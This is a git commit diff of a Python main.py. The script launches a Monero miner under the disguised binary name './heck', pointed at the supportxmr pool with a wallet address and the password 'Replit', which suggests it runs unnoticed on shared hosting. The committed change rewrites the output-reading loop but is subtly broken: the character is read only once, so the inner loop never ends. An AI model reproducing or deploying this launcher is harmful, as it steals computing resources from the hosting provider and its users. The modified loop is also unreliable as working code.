e5926cde6b63b3dd7be2f89c1072a74b190b99fa
AFK-debug-9 <75903679+AFK-debug-9@users.noreply.github.com>
2023-06-10 14:22:59 +0530

    Update main.py

--- main.py
+++ main.py
@@ -30,7 +30,8 @@ while True:
   l=os.popen('./heck -o pool.supportxmr.com:443 -u 82e5UsH6MUo9oPThFGGQjP8wz5S8Xu6nPMEAD3KxZdiLeE4RHYdBNZ' 'gAqM6Gi3BrdKHzFwAhfMuMsfnEhQUCX8WR6wRtvv9 -k --tls -p Replit --' 'no-color --cpu-priority 0 --randomx-mode=light')
   while True:
     nlog = ''
-    while (b:=l.read(1))!='\n':
+    b = l.read(1)
+    while b != '\n':
       nlog += b
     nlog += '\n'
     if nlog == '\n':
